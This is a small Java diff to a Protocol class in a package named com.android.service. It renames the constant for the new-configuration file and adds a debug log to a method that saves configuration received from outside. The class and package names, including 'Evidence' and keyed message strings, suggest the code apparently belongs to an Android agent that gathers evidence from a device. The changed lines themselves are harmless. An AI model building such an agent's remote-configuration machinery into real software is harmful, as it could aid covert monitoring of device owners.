@@ -20,6 +20,7 @@ import com.android.service.LogR;
 import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfType;
 import com.android.service.conf.Configuration;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
@@ -87,8 +88,12 @@ public abstract class Protocol {
 	 *             the command exception
 	 */
 	public synchronized static boolean saveNewConf(final byte[] conf, final int offset) throws CommandException {
-		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
+		final AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveNewConf): " + file);
+		}
+		
 		if (file.write(conf, offset, false)) {
 			Evidence.info(Messages.getString("5.1")); //$NON-NLS-1$
 			return true;
